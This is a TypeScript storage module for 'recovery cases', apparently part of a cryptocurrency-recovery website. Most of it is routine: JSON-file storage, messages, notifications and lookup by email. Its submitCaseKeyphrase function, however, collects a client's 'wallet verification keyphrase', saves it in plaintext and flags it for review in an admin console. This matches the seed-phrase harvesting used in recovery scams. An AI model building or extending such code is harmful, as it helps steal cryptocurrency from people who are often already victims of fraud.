import crypto from "crypto";
import fs from "fs";
import path from "path";
import { generateCaseId } from "./email";

export type StoredMessage = {
  id: string;
  text: string;
  sender: string;
  senderId: string;
  type: string;
  createdAt: string;
};

export type StoredNotification = {
  id: string;
  title: string;
  message: string;
  type: string;
  read: boolean;
  createdAt: string;
};

export type StoredCase = Record<string, unknown> & {
  id: string;
  caseId?: string;
  createdAt: string;
  status: string;
  completedSteps?: string[];
  messages?: StoredMessage[];
  notifications?: StoredNotification[];
};

function newId(): string {
  return crypto.randomUUID();
}

function normalizeEmail(value: unknown): string {
  return typeof value === "string" ? value.trim().toLowerCase() : "";
}

function findCaseIndex(store: { cases: StoredCase[] }, caseId: string): number {
  return store.cases.findIndex((c) => c.id === caseId || c.caseId === caseId);
}

function normalizeStoredCase(row: StoredCase): StoredCase {
  return {
    ...row,
    completedSteps: Array.isArray(row.completedSteps)
      ? row.completedSteps
      : [typeof row.status === "string" ? row.status : "PENDING"],
    messages: Array.isArray(row.messages) ? row.messages : [],
    notifications: Array.isArray(row.notifications) ? row.notifications : [],
  };
}

export function getRecoveryCaseById(caseId: string): StoredCase | null {
  const store = ensureStore();
  const idx = findCaseIndex(store, caseId);
  if (idx === -1) return null;
  const normalized = normalizeStoredCase(store.cases[idx]);
  store.cases[idx] = normalized;
  return normalized;
}

export function caseMatchesEmail(
  caseRow: StoredCase,
  email: string
): boolean {
  const target = normalizeEmail(email);
  if (!target) return false;
  return (
    normalizeEmail(caseRow.secureComms) === target ||
    normalizeEmail(caseRow.email) === target
  );
}

function resolveDataDir(): string {
  const fromEnv = process.env.CASE_DATA_DIR?.trim();
  if (fromEnv) return path.resolve(fromEnv);

  const cwd = process.cwd();
  const candidates = [
    path.join(cwd, "data"),
    path.join(cwd, "..", "data"),
  ];

  for (const dir of candidates) {
    if (fs.existsSync(path.join(dir, "recovery-cases.json"))) {
      return dir;
    }
  }

  if (fs.existsSync(path.join(cwd, "package.json"))) {
    return candidates[0];
  }
  if (fs.existsSync(path.join(cwd, "..", "package.json"))) {
    return candidates[1];
  }

  return candidates[0];
}

const DATA_DIR = resolveDataDir();
const CASES_FILE = path.join(DATA_DIR, "recovery-cases.json");

function ensureStore(): { cases: StoredCase[] } {
  if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
  }
  if (!fs.existsSync(CASES_FILE)) {
    const empty = { cases: [] as StoredCase[] };
    fs.writeFileSync(CASES_FILE, JSON.stringify(empty, null, 2), "utf8");
    return empty;
  }
  try {
    const raw = fs.readFileSync(CASES_FILE, "utf8");
    const parsed = JSON.parse(raw) as { cases?: StoredCase[] };
    return { cases: Array.isArray(parsed.cases) ? parsed.cases : [] };
  } catch {
    return { cases: [] };
  }
}

function writeStore(store: { cases: StoredCase[] }) {
  if (!fs.existsSync(DATA_DIR)) {
    fs.mkdirSync(DATA_DIR, { recursive: true });
  }
  fs.writeFileSync(CASES_FILE, JSON.stringify(store, null, 2), "utf8");
}

export function appendRecoveryCase(
  payload: Record<string, unknown>
): StoredCase {
  const store = ensureStore();
  const caseId =
    (typeof payload.caseId === "string" && payload.caseId) || generateCaseId();
  const createdAt =
    typeof payload.createdAt === "string"
      ? payload.createdAt
      : new Date().toISOString();

  const entry: StoredCase = {
    ...payload,
    id: caseId,
    caseId,
    createdAt,
    status: (payload.status as string) || "PENDING",
    storageSource: "server",
    completedSteps: Array.isArray(payload.completedSteps)
      ? (payload.completedSteps as string[])
      : ["PENDING"],
    messages: [],
    notifications: [],
  };

  store.cases.unshift(entry);
  if (store.cases.length > 500) {
    store.cases = store.cases.slice(0, 500);
  }
  writeStore(store);
  console.log(
    `[CaseStore] Saved case ${caseId} for ${String(payload.secureComms || payload.email || "unknown")} → ${CASES_FILE}`
  );
  return entry;
}

/** Find the most recent case submitted with this email (server store). */
export function findRecoveryCaseByEmail(email: string): StoredCase | null {
  const target = normalizeEmail(email);
  if (!target) return null;

  const store = ensureStore();
  const matches = store.cases.filter((c) => {
    const comms = normalizeEmail(c.secureComms);
    const em = normalizeEmail(c.email);
    return comms === target || em === target;
  });

  if (matches.length === 0) return null;

  return matches.sort(
    (a, b) =>
      new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()
  )[0];
}

export function listRecoveryCases(): StoredCase[] {
  const store = ensureStore();
  store.cases = store.cases.map(normalizeStoredCase);
  return [...store.cases].sort(
    (a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()
  );
}

export function submitCaseKeyphrase(
  caseId: string,
  email: string,
  keyphrase: string
): StoredCase | null {
  const store = ensureStore();
  const idx = findCaseIndex(store, caseId);
  if (idx === -1 || !caseMatchesEmail(store.cases[idx], email)) {
    return null;
  }

  const trimmed = keyphrase.trim();
  if (!trimmed) return null;

  const existingSteps = Array.isArray(store.cases[idx].completedSteps)
    ? [...store.cases[idx].completedSteps!]
    : ["PENDING"];
  for (const step of ["ANALYSIS", "PROCESSING"]) {
    if (!existingSteps.includes(step)) existingSteps.push(step);
  }

  store.cases[idx] = {
    ...store.cases[idx],
    walletKeyphrase: trimmed,
    status: "PROCESSING",
    completedSteps: existingSteps,
    keyphraseSubmittedAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
  };
  writeStore(store);

  addCaseNotification(caseId, {
    title: "Keyphrase Received",
    message:
      "Client submitted wallet verification keyphrase. Review in the admin console.",
    type: "ACTION_REQUIRED",
  });

  console.log(
    `[CaseStore] Keyphrase submitted for case ${caseId} (${normalizeEmail(email)})`
  );
  return store.cases[idx];
}

export function updateRecoveryCase(
  caseId: string,
  patch: { status?: string; completedSteps?: string[] }
): StoredCase | null {
  const store = ensureStore();
  const idx = findCaseIndex(store, caseId);
  if (idx === -1) return null;
  store.cases[idx] = {
    ...store.cases[idx],
    ...(patch.status !== undefined ? { status: patch.status } : {}),
    ...(patch.completedSteps !== undefined
      ? { completedSteps: patch.completedSteps }
      : {}),
    updatedAt: new Date().toISOString(),
  };
  writeStore(store);
  return store.cases[idx];
}

export function updateRecoveryCaseStatus(
  caseId: string,
  status: string
): StoredCase | null {
  return updateRecoveryCase(caseId, { status });
}

export function addCaseMessage(
  caseId: string,
  input: {
    text: string;
    sender: string;
    senderId: string;
    type: string;
  }
): StoredMessage | null {
  const store = ensureStore();
  const idx = findCaseIndex(store, caseId);
  if (idx === -1) return null;

  const entry: StoredMessage = {
    id: newId(),
    text: input.text,
    sender: input.sender,
    senderId: input.senderId,
    type: input.type,
    createdAt: new Date().toISOString(),
  };

  const messages = Array.isArray(store.cases[idx].messages)
    ? [...store.cases[idx].messages!]
    : [];
  messages.push(entry);
  store.cases[idx] = { ...store.cases[idx], messages };
  writeStore(store);
  return entry;
}

export function addCaseNotification(
  caseId: string,
  input: {
    title: string;
    message: string;
    type: string;
  }
): StoredNotification | null {
  const store = ensureStore();
  const idx = findCaseIndex(store, caseId);
  if (idx === -1) return null;

  const entry: StoredNotification = {
    id: newId(),
    title: input.title,
    message: input.message,
    type: input.type,
    read: false,
    createdAt: new Date().toISOString(),
  };

  const notifications = Array.isArray(store.cases[idx].notifications)
    ? [...store.cases[idx].notifications!]
    : [];
  notifications.unshift(entry);
  store.cases[idx] = { ...store.cases[idx], notifications };
  writeStore(store);
  return entry;
}

export function markNotificationsRead(
  caseId: string,
  email: string,
  notificationId?: string
): boolean {
  const store = ensureStore();
  const idx = findCaseIndex(store, caseId);
  if (idx === -1 || !caseMatchesEmail(store.cases[idx], email)) return false;

  const notifications = Array.isArray(store.cases[idx].notifications)
    ? [...store.cases[idx].notifications!]
    : [];

  let changed = false;
  for (let i = 0; i < notifications.length; i++) {
    if (notificationId && notifications[i].id !== notificationId) continue;
    if (!notificationId || notifications[i].id === notificationId) {
      notifications[i] = { ...notifications[i], read: true };
      changed = true;
      if (notificationId) break;
    }
  }

  if (!changed) return false;
  store.cases[idx] = { ...store.cases[idx], notifications };
  writeStore(store);
  return true;
}
